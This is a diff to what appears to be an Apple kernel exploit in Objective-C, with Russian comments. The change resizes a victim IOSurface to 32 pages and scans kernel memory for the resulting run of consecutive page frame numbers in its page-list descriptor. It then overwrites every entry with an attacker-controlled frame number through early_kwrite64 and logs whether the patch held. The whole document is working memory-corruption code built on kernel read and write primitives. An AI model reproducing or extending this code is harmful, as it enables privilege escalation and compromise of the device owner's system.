@@ -5726,10 +5726,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     }
 
     // 1. victim surface (dst for the scaler) + control page (our target)
-    NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth: @32, (__bridge id)kIOSurfaceHeight: @32,
-                         (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
-    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    // 1.9.238: dst 1024×128 BGRA = 512KB = 32 страницы — page-list root-MD из 32
+    // последовательных pfn32: сигнатура, которую DEP найдёт детерминированно
+    // (выигрыш 1.9.207 = голый pfn32, но одиночный он теряется в типах фреймов).
+    NSDictionary *sp32 = @{(__bridge id)kIOSurfaceWidth: @32, (__bridge id)kIOSurfaceHeight: @32,
+                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    NSDictionary *spBig = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @128,
+                            (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)spBig);
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp32);
     if (!dstS || !srcS) { [r appendString:@"FAIL: surfaces\n"]; return r; }
     uint32_t dstID = IOSurfaceGetID(dstS);
     uint32_t srcID = IOSurfaceGetID(srcS);
@@ -6285,6 +6290,29 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
+                    // 1.9.238: PAGE-LIST серия — dst теперь 32 страницы, page-list
+                    // root-MD = 32 последовательных pfn32. Ищем серию ≥4: q==pfn32,
+                    // pfn32+1, pfn32+2, … — случайной быть не может. Патчим ВСЕ.
+                    if (q == (uint64_t)pfn32) {
+                        uint32_t run = 1;
+                        for (uint32_t r = 1; r < 32 && o + (uint64_t)(r + 1) * 8 <= sizeof(pbuf2); r++) {
+                            uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)r * 8, 8);
+                            if (qn == (uint64_t)pfn32 + r) run++; else break;
+                        }
+                        if (run >= 4) {
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn @ %#llx+%#x — патчим все на ctlPFN %#x",
+                                      run, (unsigned long long)kva, o, ctlPFN]);
+                            for (uint32_t r = 0; r < run; r++) {
+                                usleep(1500);
+                                early_kwrite64(kva + o + (uint64_t)r * 8, (uint64_t)ctlPFN);
+                            }
+                            uint64_t rb = early_kread64(kva + o);
+                            kpNote(r, [NSString stringWithFormat:@"      readback[0]: %#018llx — %@", (unsigned long long)rb, rb == (uint64_t)ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                            // записываем в hit-массив для retry/форж-вайринга (форма2 = голый pfn — retry пишет ctlPFN)
+                            hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
+                            continue;
+                        }
+                    }
                     int form = 0;
                     if (q == backingPA) form = 1;
                     else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) form = 3;   // слот-форма pfn<<32|1 — отличительная
